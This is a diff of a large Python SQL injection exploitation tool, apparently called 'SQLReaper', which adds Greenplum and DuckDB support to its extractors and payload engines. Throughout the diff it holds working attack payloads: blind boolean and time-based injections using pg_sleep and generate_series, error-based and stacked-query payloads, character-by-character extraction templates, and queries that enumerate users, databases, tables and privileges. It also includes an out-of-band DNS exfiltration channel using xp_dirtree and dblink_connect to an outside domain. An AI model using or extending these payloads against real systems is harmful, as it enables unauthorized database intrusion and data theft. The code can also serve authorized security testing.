             "ClickHouse": "coalesce(ascii(substring(({query}),{pos},1)),0)",
+            # BUG-ZKE-CHARFN-GREENPLUM-DUCKDB FIX (HIGH): Greenplum and DuckDB were absent
+            # from _zk_default_charfn → fell to default "ASCII(SUBSTRING(...))" without the
+            # COALESCE null-safety wrapper. NULL at end-of-string propagates to the binary
+            # search oracle → comparison NULL >= mid → UNKNOWN → wrong last character.
+            # Both are PostgreSQL-compatible and use COALESCE(ASCII(SUBSTRING(...))).
+            "Greenplum": "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "DuckDB":    "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
         }.get(dbms, "ASCII(SUBSTRING(({query}),{pos},1))")
         char_fn_tmpl = self.queries.get("char_func", _zk_default_charfn)
         # BUG-ZK-CHAR-HI-MYSQL-SQLITE-PG FIX (part 2/2 — _zk_char_hi):
@@ -100986,7 +101332,8 @@ class MultiOracleConsensusExtractor:
             # MySQL raises ERROR 1064; every length probe fails → length always 0 → empty output.
             # Fix: wrap sql_query in parens: CHAR_LENGTH(({sql_query})).
             len_func = f"COALESCE(CHAR_LENGTH(({sql_query})),0)"
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB"):
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB",
+                            "Greenplum", "DuckDB"):
             # BUG-V143-MOCE-YUGABYTEDB-LEN-FUNC FIX: added "YugabyteDB" to this branch.
             # BUG-V167-MOCE-LEN-PG-NO-PARENS-NO-COALESCE FIX (HIGH): was LENGTH({sql_query}::text)
             # — missing parens around sql_query (subquery not parenthesized → PG syntax error)
@@ -101136,7 +101483,8 @@ class MultiOracleConsensusExtractor:
             # oracle always returns None → every position returns '?' → MOCE outputs "???...?".
             # Fix: wrap sql_query in parens: ORD(SUBSTRING(({sql_query}),{pos},1)).
             char_func = f"ORD(SUBSTRING(({sql_query}),{pos},1))"
-        elif self.dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB"):
+        elif self.dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift", "YugabyteDB",
+                            "Greenplum", "DuckDB"):
             # BUG-V138-MCE-YUGABYTEDB-CHARFUNC FIX (MEDIUM, YugabyteDB):
             # YugabyteDB was missing from this branch, falling to else: ASCII(SUBSTR(...))
             # without the ::text cast or CASE WHEN EOS null guard. Without the guard,
@@ -101251,6 +101599,7 @@ class MultiOracleConsensusExtractor:
                          else 1114111 if self.dbms in ("SQLite", "PostgreSQL",
                                                         "CockroachDB", "Amazon Redshift",
                                                         "YugabyteDB",  # BUG-V170-MCE-YUGABYTEDB-CHARHI-FIX
+                                                        "Greenplum", "DuckDB",
                                                         "MySQL", "MariaDB",
                                                         "TiDB")  # BUG-V140-MCE-TIDB-CHARHI FIX
                          else 255)
@@ -101870,7 +102219,8 @@ class DoHOOBChannel:
                     f"SET @_sqrh=CHAR(92)+CHAR(92)+'{seq_prefix}'+{hx}"
                     f"+CHAR(46)+'{dom}'+CHAR(92)+CHAR(120);"
                     f"EXEC master..xp_dirtree @_sqrh-- -")
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             hx = (f"encode((SUBSTRING(({sql_query}),{sql_start},{chunk_size}))"
                   f"::bytea,$$hex$$)")
             return (f"'; SELECT dblink_connect($$host=$$||'{seq_prefix}'||"
@@ -102436,6 +102786,8 @@ class GodelianPayloadGenerator:
             "CockroachDB":     ["PostgreSQL"],
             "YugabyteDB":      ["PostgreSQL"],
             "Amazon Redshift": ["PostgreSQL"],
+            "Greenplum": ["PostgreSQL"],
+            "DuckDB": ["PostgreSQL"],
             "MSSQL":           ["MSSQL"],
             "Oracle":          ["Oracle"],
         }
@@ -102545,6 +102897,8 @@ class MetamorphicPayloadEngine:
         # BUG-SLEEP-EQUIV-REDSHIFT FIX: Amazon Redshift uses pg_sleep() (PG-compatible).
         # Prior fallback was MySQL SLEEP() — causes syntax error on Redshift.
         "Amazon Redshift": ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
+        "Greenplum": ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
+        "DuckDB": ["pg_sleep({t})", "(SELECT 1 FROM pg_sleep({t}))"],
         # MariaDB is MySQL-compatible (SLEEP/BENCHMARK both work)
         "MariaDB":    ["SLEEP({t})", "BENCHMARK({big},SHA1(1))"],
         "SQLite":     ["(SELECT LIKE('X',UPPER(HEX(RANDOMBLOB({big}*{big})))))",
@@ -103917,7 +104271,8 @@ class ScannerV11(ScannerV10):
                         _param11 = getattr(self_._result, "param", "")
                         _dbms11 = getattr(self_._result, "dbms", "PostgreSQL") or "PostgreSQL"
                         # DBMS-correct char/length functions — was only PostgreSQL+MySQL
-                        if _dbms11 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                        if _dbms11 in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                        "Greenplum", "DuckDB"):
                             _ctpl11 = "ASCII(SUBSTRING(({q}),{p},1))>={m}"
                             # BUG-V11-LTPL-PG-MYSQL FIX (HIGH): LENGTH() returns byte count for
                             # UTF-8; CHAR_LENGTH() returns character count (code-point count).
@@ -104039,6 +104394,8 @@ class ScannerV11(ScannerV10):
                             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                            "Greenplum":       "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                            "DuckDB":          "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                             "MySQL":           "ISNULL(NULL)",
                             "MariaDB":         "ISNULL(NULL)",
                             "TiDB":            "ISNULL(NULL)",
@@ -104058,6 +104415,8 @@ class ScannerV11(ScannerV10):
                             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "Greenplum":       "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "DuckDB":          "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                             "MySQL":           "ISNULL(1e0)",
                             "MariaDB":         "ISNULL(1e0)",
                             "TiDB":            "ISNULL(1e0)",
@@ -106420,6 +106779,16 @@ class WAFBlockDiscriminator:
         if candidate_result is None:
             return None
 
+        # BUG-WAFDISC-429 FIX (MEDIUM): is_waf_block() explicitly returns False for
+        # HTTP 429 (rate-limit), so when both probes receive 429, neither
+        # true_blocked nor false_blocked is True and the suppression never fires.
+        # both_waf_blocked() includes 429 in WAF_BLOCK_CODES (it is a genuine
+        # non-injection response). Check it first so symmetric rate-limiting does
+        # not produce a false-positive injection detection.
+        if cls.both_waf_blocked(true_fp, false_fp):
+            LOG.debug("WAF discriminator: both payloads WAF-blocked (incl. 429) → false positive")
+            return None
+
         true_blocked  = cls.is_waf_block(true_fp)
         false_blocked = cls.is_waf_block(false_fp)
 
@@ -106711,7 +107080,8 @@ class OrderByContextExtractor:
         elif dbms == "MSSQL":
             true_payload  = f"{original}, IIF(({condition}),1,2)"
             false_payload = f"{original}, IIF((1=0),1,2)"
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             true_payload  = f"{original}, CASE WHEN ({condition}) THEN 1 ELSE 2 END"
             false_payload = f"{original}, CASE WHEN (1=0) THEN 1 ELSE 2 END"
         elif dbms == "Oracle":
@@ -106885,7 +107255,8 @@ class OrderByContextExtractor:
                 f"(SELECT TOP 1 CONVERT(NVARCHAR(MAX),({sql_query})))))/2,0)"
             )
             char_func = "ISNULL(UNICODE(SUBSTRING((SELECT TOP 1 CONVERT(NVARCHAR(MAX),({query}))),{pos},1)),0)"
-        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             # BUG-V154-ORDERBY-PG-LENF-MISSING-COALESCE FIX (LOW, PostgreSQL/CockroachDB/
             # YugabyteDB/Amazon Redshift; OrderByContextExtractor.extract_string; B technique):
             # Previous: f"LENGTH(({sql_query}))" — functionally correct (PostgreSQL LENGTH(text)
@@ -106993,7 +107364,8 @@ class OrderByContextExtractor:
                 lo, hi = 0, 65535  # UNICODE() full BMP range
             elif dbms == "SQLite":
                 lo, hi = 0, 1114111  # UNICODE() full Unicode range
-            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB"):
                 # BUG-V150-ORDERBY-PG-CHAR-HI FIX: ASCII(SUBSTRING(...)) returns
                 # full Unicode scalar (0..U+10FFFF). hi=255 truncated non-Latin-1.
                 lo, hi = 0, 1114111  # full Unicode scalar range — was 255 (wrong)
@@ -107517,7 +107889,8 @@ class ScannerV12(ScannerV11):
             # to MySQL — no functional change, but implicit fallback was architecturally wrong.
             if dbms in ("MySQL","MariaDB","TiDB"):
                 return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({sql}),0x7e))-- -"
-            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB"):
+            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB",
+                           "Greenplum","DuckDB"):
                 return f"' AND CAST(({sql}) AS integer)-- -"
             elif dbms in ("MSSQL","Sybase"):
                 return f"' AND 1=CONVERT(int,({sql}))-- -"
@@ -107539,7 +107912,8 @@ class ScannerV12(ScannerV11):
             # TiDB EXTRACTVALUE() produces the same ~value~ pattern as MySQL.
             if dbms in ("MySQL","MariaDB","TiDB"):
                 m = re.search(r"~([^~]{1,200})~", body)
-            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB"):
+            elif dbms in ("PostgreSQL","CockroachDB","Amazon Redshift","YugabyteDB",
+                           "Greenplum","DuckDB"):
                 m = re.search(r'invalid input syntax[^:]+:\s*"?([^"\n<]{1,200})"?', body, re.I)
             elif dbms in ("MSSQL","Sybase"):
                 m = re.search(r"Conversion failed[^']*\'([^\']{1,200})\'", body, re.I)
@@ -107563,7 +107937,8 @@ class ScannerV12(ScannerV11):
             return m.group(1).strip() if m else None
 
         # FIX-v19.13: SUBSTRING for PG-compatible DBMSes; Firebird uses ASCII_VAL + FROM/FOR
-        _substr = "SUBSTRING" if dbms in ("MSSQL","PostgreSQL","CockroachDB","Amazon Redshift") else "SUBSTR"
+        _substr = "SUBSTRING" if dbms in ("MSSQL","PostgreSQL","CockroachDB","Amazon Redshift",
+                                           "YugabyteDB","Greenplum","DuckDB") else "SUBSTR"
         _ascii_fn = "ASCII"
         if dbms == "Firebird":
             _ascii_fn = "ASCII_VAL"
@@ -107573,7 +107948,8 @@ class ScannerV12(ScannerV11):
         if dbms in ("MySQL","MariaDB","TiDB"): _cast_text="CAST(({q}) AS CHAR)"
         elif dbms=="MSSQL": _cast_text="CAST(({q}) AS NVARCHAR(MAX))"
         elif dbms=="Oracle": _cast_text="TO_CHAR(({q}))"
-        elif dbms in ("PostgreSQL","CockroachDB","SQLite","Amazon Redshift","YugabyteDB"): _cast_text="CAST(({q}) AS TEXT)"
+        elif dbms in ("PostgreSQL","CockroachDB","SQLite","Amazon Redshift","YugabyteDB",
+                       "Greenplum","DuckDB"): _cast_text="CAST(({q}) AS TEXT)"
         else: _cast_text="CAST(({q}) AS VARCHAR(4000))"
 
         # Baseline for boolean comparison
@@ -107716,12 +108092,18 @@ class ScannerV12(ScannerV11):
 
         # Version / banner
         version_sql = {
-            "MySQL":      "SELECT @@version",
-            "MariaDB":    "SELECT @@version",
-            "PostgreSQL": "SELECT version()",
-            "MSSQL":      "SELECT @@version",
-            "Oracle":     "SELECT banner FROM v$version WHERE ROWNUM=1",
-            "SQLite":     "SELECT sqlite_version()",
+            "MySQL":           "SELECT @@version",
+            "MariaDB":         "SELECT @@version",
+            "TiDB":            "SELECT version()",
+            "PostgreSQL":      "SELECT version()",
+            "CockroachDB":     "SELECT version()",
+            "YugabyteDB":      "SELECT version()",
+            "Amazon Redshift": "SELECT version()",
+            "Greenplum":       "SELECT version()",
+            "DuckDB":          "SELECT version()",
+            "MSSQL":           "SELECT @@version",
+            "Oracle":          "SELECT banner FROM v$version WHERE ROWNUM=1",
+            "SQLite":          "SELECT sqlite_version()",
         }.get(dbms, "SELECT @@version")
         await _extract("Version", version_sql)
 
@@ -107730,6 +108112,7 @@ class ScannerV12(ScannerV11):
             "MySQL":"SELECT user()", "MariaDB":"SELECT user()", "TiDB":"SELECT user()",
             "PostgreSQL":"SELECT current_user", "CockroachDB":"SELECT current_user",
             "YugabyteDB":"SELECT current_user", "Amazon Redshift":"SELECT current_user",
+            "Greenplum":"SELECT current_user", "DuckDB":"SELECT current_user",
             "MSSQL":"SELECT SYSTEM_USER",
             "Oracle":"SELECT USER FROM dual", "SQLite":"SELECT 'N/A'",
         }.get(dbms, "SELECT user()")  # BUG-UNIONINFO-USER-TIDB FIX: TiDB/CRDB/YG/Redshift added
@@ -107740,6 +108123,7 @@ class ScannerV12(ScannerV11):
             "MySQL":"SELECT database()", "MariaDB":"SELECT database()", "TiDB":"SELECT database()",
             "PostgreSQL":"SELECT current_database()", "CockroachDB":"SELECT current_database()",
             "YugabyteDB":"SELECT current_database()", "Amazon Redshift":"SELECT current_database()",
+            "Greenplum":"SELECT current_database()", "DuckDB":"SELECT current_database()",
             "MSSQL":"SELECT DB_NAME()",
             # BUG-ORA-UNIONDB-FIX: ora_database_name is PL/SQL only → ORA-00904 in SQL.
             "Oracle":"SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL", "SQLite":"SELECT 'main'",
@@ -107765,6 +108149,10 @@ class ScannerV12(ScannerV11):
             # information_schema.schemata is available on Redshift with standard PG filtering.
             "Amazon Redshift": ("SELECT LISTAGG(DISTINCT schema_name,',') WITHIN GROUP (ORDER BY schema_name)"
                                 " FROM information_schema.schemata WHERE catalog_name=current_database()"),
+            "Greenplum":       ("SELECT STRING_AGG(nspname,',') FROM pg_catalog.pg_namespace"
+                                " WHERE nspname NOT LIKE 'pg_%' AND nspname != 'information_schema'"),
+            "DuckDB":          ("SELECT STRING_AGG(schema_name,',') FROM information_schema.schemata"
+                                " WHERE catalog_name=current_database()"),
             # FIX-REQ8-MSSQL-SYSDBS: STRING_AGG requires SQL Server 2017+.
             # STUFF/FOR XML PATH works from SQL Server 2005+.
             "MSSQL":      ("SELECT STUFF((SELECT ','+ name FROM master..sysdatabases "
@@ -107802,6 +108190,12 @@ class ScannerV12(ScannerV11):
                 "Amazon Redshift": (f"SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)"
                                     f" FROM information_schema.tables"
                                     f" WHERE table_schema='{current_db}' AND table_type='BASE TABLE'"),
+                "Greenplum":       ("SELECT STRING_AGG(schemaname||'.'||tablename,',')"
+                                    " FROM pg_tables"
+                                    " WHERE schemaname NOT IN ('pg_catalog','information_schema','pg_toast')"
+                                    " LIMIT 30"),
+                "DuckDB":          (f"SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
+                                    f" WHERE table_schema=current_schema() AND table_type='BASE TABLE'"),
                 # BUG-MSSQL-STRINGAGG-TABLE-FIX (Req 7/8): STRING_AGG requires SQL Server 2017+.
                 # sysobjects is deprecated; use sys.tables (available SQL Server 2005+).
                 # Use STUFF/FOR XML PATH which is compatible with SQL Server 2005+.
@@ -109002,6 +109396,29 @@ SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
         r"serializable isolation violation",     # Redshift MVCC error string
         r"pg_exception_context",                 # Redshift verbose error field
     ],
+    "Greenplum": [
+        r"operator does not exist",
+        r"syntax error at or near",
+        r"invalid input syntax for (?:type )?",
+        r"column .* does not exist",
+        r"relation .* does not exist",
+        r"ERROR:\s+division by zero",
+        r"ERROR:\s+function .* does not exist",
+        r"greenplum.*error|error.*greenplum",    # Greenplum-specific string
+        r"gp_segment_id",                        # Greenplum column
+        r"vmware.*greenplum|pivotal.*greenplum",
+    ],
+    "DuckDB": [
+        r"operator does not exist",
+        r"syntax error at or near",
+        r"invalid input syntax for (?:type )?",
+        r"column .* does not exist",
+        r"relation .* does not exist",
+        r"Binder Error",                         # DuckDB-specific error prefix
+        r"Parser Error",                         # DuckDB-specific error prefix
+        r"duckdb.*error|error.*duckdb",
+        r"Catalog Error",                        # DuckDB catalog error
+    ],
     "Generic": [
         r"sql syntax.*error", r"sql error",
         r"database error", r"jdbc.*exception",
@@ -109755,6 +110172,52 @@ def _populate_dbms_queries():
             "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
             "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
             "privileges":    "SELECT LISTAGG(privilege_type,',') WITHIN GROUP (ORDER BY privilege_type) FROM information_schema.role_table_grants WHERE grantee=current_user",
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        "Greenplum": {
+            "version":      "SELECT version()",
+            "current_db":   "SELECT current_database()",
+            "current_user": "SELECT current_user",
+            "hostname":     "SELECT 'N/A'",
+            "dbs": ("SELECT STRING_AGG(nspname,',') FROM pg_catalog.pg_namespace"
+                    " WHERE nspname NOT IN ('pg_catalog','information_schema','pg_toast')"),
+            "tables": ("SELECT STRING_AGG(schemaname||'.'||tablename,',')"
+                       " FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema','gp_toolkit')"),
+            "columns": ("SELECT STRING_AGG(column_name,',') FROM information_schema.columns"
+                        " WHERE table_schema=current_schema() AND table_name='{table}'"),
+            "count":        'SELECT COUNT(*) FROM "{db}"."{table}"',
+            "row":          'SELECT {cols} FROM "{db}"."{table}" LIMIT 1 OFFSET {offset}',
+            "users":        "SELECT STRING_AGG(rolname,',') FROM pg_roles",
+            "passwords":    "SELECT 'N/A'",
+            "char_func":     "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "char_func_hex": "LOWER(TO_HEX(COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)))",
+            "substr":        "SUBSTRING(({query}),{pos},1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "privileges":    "SELECT STRING_AGG(privilege_type,',') FROM information_schema.role_table_grants WHERE grantee=current_user",
+            "null_to_empty": "COALESCE(({query}),'')",
+        },
+        "DuckDB": {
+            "version":      "SELECT version()",
+            "current_db":   "SELECT current_database()",
+            "current_user": "SELECT current_user",
+            "hostname":     "SELECT 'N/A'",
+            "dbs": ("SELECT STRING_AGG(schema_name,',') FROM information_schema.schemata"
+                    " WHERE catalog_name=current_database()"),
+            "tables": ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
+                       " WHERE table_schema=current_schema() AND table_type='BASE TABLE'"),
+            "columns": ("SELECT STRING_AGG(column_name,',') FROM information_schema.columns"
+                        " WHERE table_schema=current_schema() AND table_name='{table}'"),
+            "count":        'SELECT COUNT(*) FROM "{table}"',
+            "row":          'SELECT {cols} FROM "{table}" LIMIT 1 OFFSET {offset}',
+            "users":        "SELECT current_user",
+            "passwords":    "SELECT 'N/A'",
+            "char_func":     "COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)",
+            "char_func_hex": "LOWER(HEX(COALESCE(ASCII(SUBSTRING(({query}),{pos},1)),0)))",
+            "substr":        "SUBSTRING(({query}),{pos},1)",
+            "len_func":      "COALESCE(CHAR_LENGTH(({query})),0)",
+            "if_func":       "CASE WHEN ({cond}) THEN {t} ELSE {f} END",
+            "privileges":    "SELECT current_user",
             "null_to_empty": "COALESCE(({query}),'')",
         },
         # BUG-V176-SYBASE-MISSING-DBMS-QUERIES-ENTRY FIX (HIGH; all extraction engines;
@@ -111705,7 +112168,7 @@ class InjectionContext:
     @classmethod
     def paren_double(cls, c="-- -"):
         """WHERE (name=\"INPUT\")"""  # noqa
-        return cls('")"', "", c, "paren+double")
+        return cls('")', "", c, "paren+double")
 
     @classmethod
     def dbl_paren_single(cls, c="-- -"):
@@ -115672,6 +116135,8 @@ class TechniqueCascadeEngine:
             # Amazon Redshift is PG-wire-compatible and uses pg_sleep() — NOT MySQL SLEEP().
             # Same fallback bug. Fix: mirror the PostgreSQL template.
             "Amazon Redshift": f"(CASE WHEN SUBSTRING('SQLReaper',1,1)='{{ch}}' THEN (SELECT 1 FROM pg_sleep({sleep_sec}::float)) ELSE 1 END)=1",
+            "Greenplum": f"(CASE WHEN SUBSTRING('SQLReaper',1,1)='{{ch}}' THEN (SELECT 1 FROM pg_sleep({sleep_sec}::float)) ELSE 1 END)=1",
+            "DuckDB": f"(CASE WHEN SUBSTRING('SQLReaper',1,1)='{{ch}}' THEN (SELECT 1 FROM pg_sleep({sleep_sec}::float)) ELSE 1 END)=1",
             # BUG-DERIVE-TIMING-SYBASE-FIX (HIGH; Sybase; _derive_timing_payloads; PCV Check B;
             # T/TH techniques):
             # Sybase ASE uses WAITFOR DELAY — NOT MySQL SLEEP(). Without an explicit entry Sybase
@@ -116833,7 +117298,8 @@ class TechniqueCascadeEngine:
             # BUG-R3-B FIX: add explicit PostgreSQL branch.
             # BUG-CHECKC-PG-CRDB FIX: CockroachDB/YugabyteDB/Redshift are PG-wire-compatible;
             # 1/0, CAST AS INTEGER, and ::integer cast all raise errors identically to PostgreSQL.
-            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB"):
                 _c_fallbacks = [
                     ("' AND 1/0-- -", "division"),
                     (" AND 1/0-- -", "division-num"),      # BUG-R3-D FIX
@@ -117138,6 +117604,20 @@ class TechniqueCascadeEngine:
                     "amazon redshift", "redshift",
                     "division by zero", "syntax error at or near", "invalid input syntax for type",
                     "relation does not exist", "column does not exist",
+                ],
+                "Greenplum": [
+                    "error:  division by zero", "error:  invalid input syntax",
+                    "error:  syntax error at or near", "error:  relation \"",
+                    "greenplum", "vmware greenplum", "pivotal greenplum",
+                    "division by zero", "syntax error at or near", "invalid input syntax for type",
+                    "relation does not exist", "column does not exist",
+                ],
+                "DuckDB": [
+                    "binder error", "parser error", "catalog error",
+                    "duckdb", "conversion error",
+                    "division by zero", "syntax error",
+                    "table with name .* does not exist",
+                    "column .* does not exist",
                 ],
                 # BUG-CHECKC-MISSING-DBMS FIX (CRITICAL): Firebird, ClickHouse, DB2, Sybase, and
                 # SAP_HANA were missing from _err_patterns → Check C always failed to match any
@@ -118149,6 +118629,8 @@ class TechniqueCascadeEngine:
                         "CockroachDB": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "YugabyteDB": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Amazon Redshift": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Greenplum": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "DuckDB": " AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Sybase":     " AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     " AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
@@ -118181,6 +118663,8 @@ class TechniqueCascadeEngine:
                         "CockroachDB": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "YugabyteDB": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Amazon Redshift": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "Greenplum": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
+                        "DuckDB": "' AND SUBSTRING('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "MSSQL":      "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Sybase":     "' AND SUBSTRING('SQLReaper',1,1)='S' AND LEN('SQLReaper')=9 AND UPPER('a')='A'-- -",
                         "Oracle":     "' AND SUBSTR('SQLReaper',1,1)='S' AND LENGTH('SQLReaper')=9 AND UPPER('a')='A'-- -",
@@ -119894,6 +120378,22 @@ class TechniqueCascadeEngine:
                  " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
                  "SUBSTRING+GENERATE_SERIES(numeric)"),
             ],
+            "Greenplum": [
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "DuckDB": [
+                ("' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "' AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
         }
 
         # BUG-CPU-4 FIX: Check _SCAN_STOPPED before building the large
@@ -120275,6 +120775,26 @@ class TechniqueCascadeEngine:
                 (f" AND (SELECT CASE WHEN 7*13=91 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
                  f" AND (SELECT CASE WHEN 7*13=92 THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "arithmetic+pg_sleep(numeric)"),
                 # ── Heavy-query fallback (Redshift supports generate_series) ──
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
+                 " AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -", "SUBSTRING+GENERATE_SERIES(numeric)"),
+            ],
+            "Greenplum": [
+                (f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) END-- -",
+                 f"'; SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) END-- -", "SUBSTRING+pg_sleep"),
+                (f"'; SELECT pg_sleep(CASE WHEN 7*13=91 THEN {_sleep_sec} ELSE 0 END)-- -",
+                 f"'; SELECT pg_sleep(CASE WHEN 7*13=92 THEN {_sleep_sec} ELSE 0 END)-- -", "STACKED+arithmetic+pg_sleep"),
+                (f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -",
+                 f" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='X' THEN pg_sleep({_sleep_sec}) ELSE pg_sleep(0) END) IS NULL-- -", "SUBSTRING+pg_sleep(numeric)"),
+                (" AND (SELECT CASE WHEN SUBSTRING('SQLReaper',1,1)='S' THEN (SELECT COUNT(*) FROM generate_series(1,5000000)) ELSE 1 END)>0-- -",
